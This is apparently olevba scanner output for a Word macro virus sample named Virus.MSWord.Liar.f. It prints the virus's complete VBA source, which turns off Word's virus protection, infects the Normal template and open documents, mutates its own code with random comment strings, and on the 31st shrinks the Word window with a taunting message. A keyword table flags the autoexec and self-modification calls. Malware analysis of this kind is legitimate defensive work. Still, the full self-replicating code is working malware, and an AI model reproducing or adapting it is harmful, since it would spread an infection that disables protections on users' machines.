olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Liar.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Liar.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_open() '
Dim v(150): Options.VirusProtection = (Rnd * 0) '
Set a = MacroContainer.VBProject: Set ab = a.VBComponents(1) '
Set abc = ab.CodeModule: Set s = NormalTemplate: t = Chr(39) '
Set nh = s.VBProject.VBComponents(1).CodeModule '
For y = 1 To Int(75 - (Rnd * 20)): vx = vx & Chr(255 - Int(Rnd * 100)): Next y '
vc = "Private Sub document_close()" & t & vx & vbCr  '
If MacroContainer = NormalTemplate Then '
Set s = ActiveDocument: Set nh = s.VBProject.VBComponents(1).CodeModule '
vc = "Private Sub document_open()" & t & vx & vbCr '
End If: Randomize: lin = abc.countoflines '
For i = 2 To lin '
jc = "": d = Int(Rnd * 3): p = InStr(abc.Lines(i, 1), t) '
If p = 0 Then GoTo e_ '
If p = 1 And lin > 100 Then '
d = 1: GoTo n_ '
End If '
v(i) = Left(abc.Lines(i, 1), (p - 1)) '
For j = 1 To Int(75 - (Rnd * 20))  '
jc = jc & Chr(255 - Int(Rnd * 100)) '
Next j '
v(i) = v(i) & t & jc '
If d = 2 Then v(i) = v(i) & vbCr & t & jc '
vc = vc & v(i) & vbCr '
n_: '
Next i '
e_: '
If nh.countoflines < (1 + 1) Then '
nh.AddFromString vc: s.Save '
End If '
If Day(Now()) = (30 + 1) Then '
MsgBox Application.UserName & "is bliemed!", 64, "Class.bliem by jacktwo lzo/meta" '
Set ak = Application: aHeight = ak.Height: aWidth = ak.Width '
ak.WindowState = wdWindowStateNormal: ak.Height = aHeight: ak.Width = aWidth '
ak.Caption = "Now you Word is bliemed...": z = 1 '
For o = 0 To ak.Height: ak.Height = ak.Height - z: DoEvents: Next o '
For l = 0 To ak.Width: ak.Width = ak.Width - z: DoEvents: Next l '
For m = 0 To ak.Left: ak.Left = ak.Left - z: DoEvents: z = z + 1: Next m '
End If '
End Sub '
Rem Another virus by Jack Twoflower [LineZer0 & Metaphase] '
Rem Uses "bliem" polymorhic engine by Jack Twoflower '

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

